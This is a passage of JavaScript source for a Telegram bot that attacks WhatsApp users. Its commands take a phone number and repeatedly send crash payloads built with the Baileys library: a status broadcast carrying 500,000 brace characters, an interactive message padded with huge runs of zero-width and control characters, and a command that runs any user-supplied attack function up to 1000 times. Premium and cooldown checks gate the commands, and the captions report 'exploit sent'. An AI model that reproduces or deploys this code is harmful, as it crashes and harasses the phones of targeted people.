</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("iosfc", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /iosfc 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: iosfc
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await CrashIosInvisib(sock, target, i = 1);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: iosfc
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Unknown Exploit
</blockquote>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: Unknown Exploit
</blockquote>`;
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)



//FUNC AMPAS LO TARO DISINI
async function FcSpamX(sock, target) {
const nanX = {
interactiveMessage: {
header: {
bloksWidget: {
fallback: "\u200D".repeat(50000),
type: "\u200F".repeat(50000),
data: "[".repeat(50000),
uuid: "\u200B".repeat(50000),
},
subtitle: "\u0010".repeat(50000),
title:  "CrB-ExPlOID",
},
nativeFlowMessage: { 
buttons: [{}] 
},
body: { 
text: "\u000F".repeat(50000),
},
},
};

const msg = generateWAMessageFromContent(target, nanX, {});

await sock.relayMessage(target, msg.message, {
noSelfSync: true,
messageId: msg.key.id,
});
}
async function CrashIosInvisib(sock, target, i = 1) {
  for (let z = 0; z < i; z++) {
    await sock.relayMessage('status@broadcast', {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [],
            unifiedResponse: {
              data: Buffer.from(JSON.stringify({
                response_id: crypto.randomUUID(),
                sections: [
                  {
                    view_model: {
                      primitive: {
                        text: "Parapel Company",
                        inline_entities: ["{".repeat(500000)],
                        __typename: "GenAIMarkdownTextUXPrimitive",
                        },
                      __typename: "GenAISingleLayoutViewModel",
                    }
                  }
                ]
              }))
            },
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              forwardOrigin: 4,
              forwardedAiBotMessageInfo: {
                botJid: "0@bot"
              }
            }
          }
        }
      }
    }, {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_user",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    })
  }
}
bot.launch()
